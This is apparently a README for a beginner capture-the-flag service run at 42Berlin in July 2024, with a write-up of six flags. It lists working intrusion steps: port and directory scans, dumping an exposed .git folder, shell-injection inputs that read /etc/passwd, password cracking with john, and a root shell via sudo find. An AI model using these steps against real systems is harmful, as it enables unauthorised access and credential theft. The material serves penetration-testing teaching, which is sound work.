# 42Berlin CTF July 2024

This repo contains the service used for the CTF hosted in 42Berlin in July 2024.

In order to host it again, a new service needs to be deployed for it to submit the flags.
The project https://ctfd.io/ is an easy and customizable option.

## Content

The service is deployed using docker-compose. It creates a container running the following services:
- Port 22: SSH server with password authentication configured
- Port 4242: Python Flask server hosting the vulnerable service
- Port 42424: Python Flask server hosting a single page with a flag

The directory tools is not used in the deployment, it contains the files and tools provided to students
during the challenge.

## Write-Up

This CTF is meant to be an introduction to penetration testing, where very step is awarded with a flag.

### Flag 1
The first flag is after performing a port scan with nmap.

```$ nmap -p- hackme.42berlin.de```

After scanning all ports, nmap shows that the ports 22, 4242 and 42424 are open. The flag is present in the port 42424.

### Flag 2
The second flag is found after brute-forcing the directories running on port 4242. Also a .git folder is present.

```$ gobuster dir -u http://hackme.42berlin.de:4242 -w /usr/share/wordlists/fuzzing_wordlist.txt```

### Flag 3
For the third flag, it is necessary to read the source code of the application. In order to do this, the tool gitdumper is available.

```$ git-dumper http://hackme.42berlin.de/.git /tmp/ctf_git_dump```

After dumping the source code, two interesting things are found:
- The flag
- Credentials to authenticate as an administrator in the application

### Flag 4
After authenticaing, users can test the admin tool.

By analizing the code, a vulnerable line is found when executing the file check_command.sh. As the input is not properly sanitized,
users can execute arbitrary shell commands on the server.

Input to get the flag:
"$(cat /home/adrian/flag.txt)"

### Flag 5
To get the fifth flag, its necessary to read the /etc/passwd file on the server

Input to get the hash:
"$(cat /etc/passwd)"

To crack the hash, the tool john the ripper is provided.

```$ john hash.txt –wordlist=/usr/share/wordlists/password_wordlists.txt```

To get the flag, login via ssh as pedro:
```
$ ssh -p 22 pedro@hackme.42berlin.de
# cat /home/pedro/flag.txt
```
### Flag 6
The last flag can be found after rooting the server. To do this, basic Linux enumeration will do the trick.
```
$ sudo -l
User pedro may run the following commands on 6f8198e12837:
    (ALL) /bin/find
```
The find command can be used to escalate privileges if the command is executed with the root PID -> https://gtfobins.github.io/gtfobins/find/
```
$ sudo find / -exec /bin/bash \;
# cat /root/flag.txt
```